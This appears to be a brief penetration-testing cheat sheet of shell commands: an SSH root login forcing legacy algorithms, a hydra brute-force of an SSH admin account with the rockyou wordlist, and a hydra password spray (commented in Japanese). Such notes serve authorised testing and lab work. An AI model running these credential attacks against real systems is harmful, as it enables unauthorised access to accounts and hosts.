```sh
ssh root@10.10.10.7 -oKexAlgorithms=diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.1 -t 64 -f -V

# パスワードスプレー
hydra -L user.txt -p password ssh://192.168.0.1 -t 64 -V
```